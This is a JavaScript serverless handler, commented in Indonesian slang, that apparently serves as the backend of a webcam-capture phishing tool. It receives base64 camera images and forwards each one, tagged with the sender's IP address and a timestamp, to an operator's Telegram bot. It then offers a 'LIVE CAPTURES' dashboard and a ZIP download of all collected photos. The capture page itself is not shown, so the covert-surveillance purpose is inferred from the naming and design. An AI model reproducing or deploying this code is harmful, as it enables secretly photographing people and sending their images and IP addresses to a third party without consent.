import { create } from 'archiver';

export default async function handler(req, res) {
    // ===== GANTI BOT_TOKEN & CHAT_ID DI SINI ATAU PAKE ENV =====
    const botToken = process.env.BOT_TOKEN || "1234567890:ABCdefGHIjklMNOpqrsTUVwxyz"; // GANTI MANUAL KALO LU MALES ENV
    const chatId = process.env.CHAT_ID || "-1001234567890"; // GANTI MANUAL KALO LU MALES ENV

    // 1. POST - TERIMA FOTO & FORWARD KE TELEGRAM
    if (req.method === 'POST') {
        try {
            const { img, ts } = req.body;
            const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown';
            const buf = Buffer.from(img, 'base64');
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('photo', new Blob([buf], { type: 'image/jpeg' }), `cam_${ip.replace(/:/g,'_')}_${ts}.jpg`);
            formData.append('caption', `IP: ${ip} | ${new Date(ts).toISOString()}`);
            await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                method: 'POST',
                body: formData
            });
            res.status(200).send('OK');
        } catch(e) {
            res.status(500).json({ error: e.message });
        }
        return;
    }

    // 2. GET ?pack - DOWNLOAD SEMUA FOTO JADI ZIP
    if (req.query.pack !== undefined) {
        try {
            const updates = await fetch(`https://api.telegram.org/bot${botToken}/getUpdates?chat_id=${chatId}&limit=100`)
                .then(r => r.json());
            const photos = updates.result
                .filter(u => u.message && u.message.photo)
                .map(u => u.message.photo.pop().file_id);
            if (photos.length === 0) return res.status(404).send('Tidak ada foto');
            const archive = create('zip');
            res.setHeader('Content-Type', 'application/zip');
            res.setHeader('Content-Disposition', 'attachment; filename=captures.zip');
            archive.pipe(res);
            for (const fileId of photos) {
                const fileInfo = await fetch(`https://api.telegram.org/bot${botToken}/getFile?file_id=${fileId}`)
                    .then(r => r.json());
                const fileUrl = `https://api.telegram.org/file/bot${botToken}/${fileInfo.result.file_path}`;
                const fileStream = await fetch(fileUrl).then(r => r.body);
                archive.append(fileStream, { name: `${fileId}.jpg` });
            }
            await archive.finalize();
        } catch(e) {
            res.status(500).json({ error: e.message });
        }
        return;
    }

    // 3. GET ?dashboard - LIHAT FOTO DI BROWSER
    if (req.query.dashboard !== undefined) {
        try {
            const updates = await fetch(`https://api.telegram.org/bot${botToken}/getUpdates?chat_id=${chatId}&limit=50`)
                .then(r => r.json());
            let html = `<!DOCTYPE html><html><head><meta http-equiv="refresh" content="10"><title>DASHBOARD</title><style>body{background:#111;color:#0f0;font-family:monospace;padding:20px;}.grid{display:flex;flex-wrap:wrap;}.item{margin:5px;border:1px solid #0f0;padding:5px;}img{max-width:200px;}</style></head><body><h1>📸 LIVE CAPTURES</h1><div class="grid">`;
            for (const u of updates.result) {
                if (!u.message?.photo) continue;
                const fileId = u.message.photo.pop().file_id;
                const fileInfo = await fetch(`https://api.telegram.org/bot${botToken}/getFile?file_id=${fileId}`).then(r=>r.json());
                const fileUrl = `https://api.telegram.org/file/bot${botToken}/${fileInfo.result.file_path}`;
                html += `<div class="item"><img src="${fileUrl}"><br>${u.message.caption || ''}</div>`;
            }
            html += `</div></body></html>`;
            res.setHeader('Content-Type', 'text/html');
            res.status(200).send(html);
        } catch(e) {
            res.status(500).send('Error: ' + e.message);
        }
        return;
    }

    res.status(200).send('Bot is running. Use ?dashboard or ?pack');
}